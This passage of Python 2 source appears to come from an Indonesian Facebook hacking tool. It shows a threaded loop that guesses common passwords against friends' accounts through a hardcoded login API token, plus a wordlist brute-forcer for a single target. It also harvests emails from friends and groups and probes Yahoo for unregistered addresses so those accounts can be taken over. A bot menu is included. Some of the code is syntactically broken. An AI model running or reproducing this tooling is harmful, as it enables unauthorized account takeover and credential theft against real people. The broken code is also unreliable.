                        print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass3 + ' =>' + z['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        lahir = b['birthday']
                        pass4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass4 + ' =>' + z['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            cek = open('out/super_cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = ('sayang123', 'sayangku123')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass5 + ' =>' + z['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = ('bintang123', 'bintang12345')
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass6 + ' =>' + z['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                    b = json.loads(a.text)
                                    pass7 = ('sayang', 'doraemon', 'bintang', 'someone', 'bajingan', 'anjing', 'pukimak', 'playboy')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass7 + ' =>' + z['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass8 = ('januari', 'februari', 'maret123', 'april', 'mei123', 'juni123', 'juli123', 'agustus', 'september', 'november', 'desember')
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass8 + ' =>' + z['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal OK/CP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;91m[+] \x1b[1;92mCP File saved \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
    os.system('python2 mbf.py')


def brute():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    
    try:
        email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
        total = open(passw, 'r')
        total = total.readlines()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
        print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        sandi = open(passw, 'r')
        for pw in sandi:
            
            try:
                pw = pw.replace('\n', '')
                sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;91m: \x1b[1;97m' + pw)
                sys.stdout.flush()
                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                mpsh = json.loads(data.text)
                if 'access_token' in mpsh:
                    dapat = open('Brute.txt', 'w')
                    dapat.write(email + ' | ' + pw + '\n')
                    dapat.close()
                    print '\n\x1b[1;91m[+] \x1b[1;92mFound'
                    print 42 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                    keluar()
                elif 'www.facebook.com' in mpsh['error_msg']:
                    ceks = open('Brutecekpoint.txt', 'w')
                    ceks.write(email + ' | ' + pw + '\n')
                    ceks.close()
                    print '\n\x1b[1;91m[+] \x1b[1;92mFound'
                    print 42 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                    keluar()
            continue
            except requests.exceptions.ConnectionError:
                print '\x1b[1;91m[!] Tidak ada koneksi'
                time.sleep(0.01)
                continue
            

    except IOError:
        print '\x1b[1;91m[!] File tidak ada'
        tanyaw()



def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mApakah ada ingin membuat wordlist ? \x1b[1;92m[y/n]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] salah'
        tanyaw()
    elif why == 'y':
        wordlist()
    elif why == 'Y':
        wordlist()
    elif why == 'n':
        menu_hack()
    elif why == 'N':
        menu_hack()
    else:
        print '\x1b[1;91m[!] salah'
        tanyaw()


def menu_yahoo():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;96m{\x1b[1;94m01\x1b[1;96m}\x1b[1;91m Clone daftar teman'
    print '\x1b[1;96m{\x1b[1;94m02\x1b[1;96m}\x1b[1;91m Clone daftar teman dari teman'
    print '\x1b[1;96m{\x1b[1;94m03\x1b[1;96m}\x1b[1;91m Clone dari member group'
    print '\x1b[1;96m{\x1b[1;94m04\x1b[1;96m}\x1b[1;91m Colne dari file'
    print '\x1b[1;96m{\x1b[1;94m03\x1b[1;96m}\x1b[1;92m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if go == '':
        print '\x1b[1;91m[!] salah'
        yahoo_pilih()
    elif go == '1':
        yahoofriends()
    elif go == '2':
        yahoofromfriends()
    elif go == '3':
        yahoomember()
    elif go == '4':
        yahoolist()
    elif go == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[!] salah'
        yahoo_pilih()


def yahoofriends():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan email teman \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/MailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
    os.system('python2 mbf.py')


def yahoofromfriends():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
    
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;91m[!] ID teman tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_yahoo()

    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan email dari teman \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/FriendMailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FriendMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
    os.system('python2 mbf.py')


def yahoomember():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;91m[!] ID Group Tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_yahoo()

    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan email dari group \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/GrupMailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
    os.system('python2 mbf.py')


def yahoolist():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    files = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan File \x1b[1;91m: \x1b[1;97m')
    
    try:
        total = open(files, 'r')
        mail = total.readlines()
    except IOError:
        print '\x1b[1;91m[!] File tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    save = open('out/FileMailVuln.txt', 'w')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr = 0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail
                berhasil.append(mail)
            
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
    menu_yahoo()


def menu_bot():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;94m01\x1b[1;97m}\x1b[1;97m Bot React Post Target'
    print '\x1b[1;97m{\x1b[1;94m02\x1b[1;97m}\x1b[1;97m Bot React Grup Post'
    print '\x1b[1;97m{\x1b[1;94m03\x1b[1;97m}\x1b[1;97m Bot Komen Target Post'
    print '\x1b[1;97m{\x1b[1;94m04\x1b[1;97m}\x1b[1;97m Bot Komen Grup Post'
    print '\x1b[1;97m{\x1b[1;94m05\x1b[1;97m}\x1b[1;97m hapus postingan'
    print '\x1b[1;97m{\x1b[1;94m06\x1b[1;97m}\x1b[1;97m acc pertemanan'
    print '\x1b[1;97m{\x1b[1;94m07\x1b[1;97m}\x1b[1;97m hapus pertemanan'
    print '\x1b[1;97m{\x1b[1;94m00\x1b[1;97m}\x1b[1;97m keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    bot_pilih()


def bot_pilih():
    bots = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if bots == '':
        print '\x1b[1;91m[!] salah'
        bot_pilih()
    elif bots == '1':
        menu_react()
    elif bots == '2':
        grup_react()
    elif bots == '3':
        bot_komen()
    elif bots == '4':
        grup_komen()
    elif bots == '5':
        deletepost()
    elif bots == '6':
        accept()
    elif bots == '7':
        unfriend()
    elif bots == '0':
        menu()
    else:
        print '\x1b[1;91m[!] salah'
        bot_pilih()


def menu_react():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;91m{\x1b[1;94m01\x1b[1;91m} \x1b[1;97mLike'
    print '\x1b[1;91m{\x1b[1;94m02\x1b[1;91m} \x1b[1;97mLove'
    print '\x1b[1;91m{\x1b[1;94m03\x1b[1;91m} \x1b[1;97mWow'
    print '\x1b[1;91m{\x1b[1;94m04\x1b[1;91m} \x1b[1;97mHaha'
    print '\x1b[1;91m{\x1b[1;94m05\x1b[1;91m} \x1b[1;97mSadBoy'
    print '\x1b[1;91m{\x1b[1;94m06\x1b[1;91m} \x1b[1;97mAngry'
    print '\x1b[1;91m{\x1b[1;94m00\x1b[1;91m} \x1b[1;97m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if aksi == '':
        print '\x1b[1;91m[!] Salah'
        react_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        react()
    elif aksi == '2':
        tipe = 'LOVE'
        react()
    elif aksi == '3':
        tipe = 'WOW'
        react()
    elif aksi == '4':
        tipe = 'HAHA'
        react()
    elif aksi == '5':
        tipe = 'SAD'
        react()
    elif aksi == '6':
        tipe = 'ANGRY'
        react()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[!] Salah'
        react_pilih()


def react():
